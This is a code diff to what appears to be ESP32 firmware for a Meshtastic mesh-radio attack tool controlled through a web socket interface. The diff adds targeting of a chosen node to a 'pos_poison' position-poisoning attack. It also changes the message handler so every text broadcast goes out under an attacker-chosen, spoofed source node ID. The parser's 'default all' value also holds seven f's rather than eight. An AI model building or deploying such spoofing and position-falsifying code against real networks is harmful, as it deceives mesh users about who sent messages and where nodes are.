@@ -112,6 +112,18 @@ void app_main(void) {
     }
 }
 
+uint32_t getNodeIdFromCh(const char* source_id) {
+    uint32_t srcnode = 0xfffffff;  // default all
+    const char* hexstr = (*source_id == '!') ? source_id + 1 : source_id;
+    char* endptr;  // To check if the whole string was converted
+    errno = 0;     // Reset errno before the call
+    unsigned long value = strtoul(hexstr, &endptr, 16);
+    if (endptr != hexstr && *endptr == '\0' && errno != ERANGE && value <= 0xFFFFFFFF) {
+        srcnode = (uint32_t)value;
+    }
+    return srcnode;
+}
+
 void handle_start_attack(const char* attack_type, JSON_Object* params) {
     ESP_LOGI("WEB", "Handling 'start_attack': %s", attack_type);
     if (strcmp(attack_type, "pos_poison") == 0 && params != NULL) {
@@ -119,10 +131,13 @@ void handle_start_attack(const char* attack_type, JSON_Object* params) {
         double max_lat = json_object_get_number(params, "max_lat");
         double min_lon = json_object_get_number(params, "min_lon");
         double max_lon = json_object_get_number(params, "max_lon");
+        const char* target_id = json_object_get_string(params, "target_id");
         ESP_LOGI("WEB", "Position Poisoning Attack Params: min_lat=%.6f, max_lat=%.6f, min_lon=%.6f, max_lon=%.6f", min_lat, max_lat, min_lon, max_lon);
         tmAttack.setPosAttackParams(min_lat, max_lat, min_lon, max_lon);
+        tmAttack.setTarget(getNodeIdFromCh(target_id));
         tmAttack.setAttackType(AttackType::POS_POISON);
-        std::string wsmsg = "{\"type\":\"status_update\", \"current_attack\":\"Position Poison\"}";
+
+        std::string wsmsg = "{\"type\":\"status_update\", \"current_attack\":\"pos_poison\"}";
         ws_sendall((uint8_t*)wsmsg.c_str(), wsmsg.length(), true);
     }
 }
@@ -131,12 +146,12 @@ void handle_set_config(JSON_Object* params) {
     ESP_LOGI("WEB", "Handling 'set_config'");
     double frequency = json_object_get_number(params, "frequency");
     double bandwidth = json_object_get_number(params, "bandwidth");
-    double sf = json_object_get_number(params, "spreading_factor");  // Numbers are doubles in parson
+    double sf = json_object_get_number(params, "spreading_factor");
 
     ESP_LOGI("WEB", "Config: Freq=%.1f, BW=%.1f, SF=%.0f", frequency, bandwidth, sf);
-    // TODO: Your logic here
+    // TODO:  logic here
 }
-// ... other handlers
+
 void handle_stop_attack() {
     tmAttack.setAttackType(AttackType::NONE);
     ESP_LOGI("WEB", "Handling 'stop_attack'");
@@ -146,18 +161,11 @@ void handle_stop_attack() {
 
 void handle_send_message(const char* source_id, const char* message) {
     ESP_LOGI("WEB", "Handling 'send_message' from %s: %s", source_id, message);
-    uint32_t srcnode = 0xabbababa;  // default
-    const char* hexstr = (*source_id == '!') ? source_id + 1 : source_id;
-    char* endptr;  // To check if the whole string was converted
-    errno = 0;     // Reset errno before the call
-    unsigned long value = strtoul(hexstr, &endptr, 16);
-    if (endptr != hexstr && *endptr == '\0' && errno != ERANGE && value <= 0xFFFFFFFF) {
-        srcnode = (uint32_t)value;
-        meshtasticCompact.SendTextMessage(std::string(message), 0xffffffff, 8, MC_MESSAGE_TYPE_TEXT, srcnode);
-        ESP_LOGI("WEB", "Sent message with srcnode=0x%08" PRIx32, srcnode);
-        std::string wsmsg = "{\"type\":\"debug\", \"message\":\"Sent message.\"}";
-        ws_sendall((uint8_t*)wsmsg.c_str(), wsmsg.length(), true);
-    }
+    uint32_t srcnode = getNodeIdFromCh(source_id);
+    meshtasticCompact.SendTextMessage(std::string(message), 0xffffffff, 8, MC_MESSAGE_TYPE_TEXT, srcnode);
+    ESP_LOGI("WEB", "Sent message with srcnode=0x%08" PRIx32, srcnode);
+    std::string wsmsg = "{\"type\":\"debug\", \"message\":\"Sent message.\"}";
+    ws_sendall((uint8_t*)wsmsg.c_str(), wsmsg.length(), true);
 }
 
 void handle_initme() {
